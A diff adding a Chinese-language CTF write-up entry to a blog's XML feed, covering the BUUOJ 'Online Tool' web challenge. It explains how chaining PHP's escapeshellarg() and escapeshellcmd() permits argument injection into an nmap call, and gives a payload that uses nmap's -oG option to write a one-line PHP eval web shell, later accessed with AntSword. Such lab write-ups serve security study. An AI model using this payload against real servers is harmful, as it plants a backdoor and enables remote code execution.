@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>【BUUOJ】Web-Online Tool</title>
+    <link href="/2021/04/19/Online-Tools/"/>
+    <url>/2021/04/19/Online-Tools/</url>
+    
+    <content type="html"><![CDATA[<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>PHP代码审计：<br><img src="https://i.loli.net/2021/04/19/la6cGN5tdzrFgy2.png"></p><p>本题主要考点就是 <code>escapeshellarg()</code> 函数和 <code>escapeshellcmd()</code> 函数的漏洞。</p><p>这两个函数的官方文档如下：</p><p><a href="https://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></p><p><a href="https://www.php.net/manual/zh/function.escapeshellcmd.php">escapeshellcmd</a></p><p>那么漏洞如何利用呢？</p><p>具体原理如下：</p><blockquote><p>1.传入的参数是：172.17.0.2’ -v -d a=1<br><br>2.经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br><br>3.经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义。<br><br>4.最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p></blockquote><p>现在要做的就是构造payload，要想办法注入一句话木马。查阅信息可知：nmap函数有一个 <code>-oG</code> 参数可以实现命令和结果写入到文件。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">?host=&#x27; </span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;hack&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG a.php &#x27;</span><br></code></pre></td></tr></table></figure><p>上传后返回如下界面：<br><img src="https://i.loli.net/2021/04/19/M8eGCSvHyDkxN69.png"></p><p>sandbox至Starting之间的值即为上传文件的文件夹。直接访问这个文件夹返回403禁止访问。</p><p>但是根据我们的payload，我们把木马写入了a.php，那么在刚才的文件夹里直接访问a.php，发现是可行的。</p><p><img src="https://i.loli.net/2021/04/19/dTpZMePSlJ6Whwq.png"></p><p><img src="https://i.loli.net/2021/04/19/1CbX9LIHt6WAhmP.png"></p><p>蚁剑连接，在首目录下可以看到flag</p><p><img src="https://i.loli.net/2021/04/19/yIapwTr3ZNWlmXo.png"></p><p><img src="https://i.loli.net/2021/04/19/KkO3woTZSh9qaiY.png"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>CTF</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Linux的空格过滤</title>
     <link href="/2021/04/16/Linux%E7%9A%84%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/"/>
     <url>/2021/04/16/Linux%E7%9A%84%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/</url>
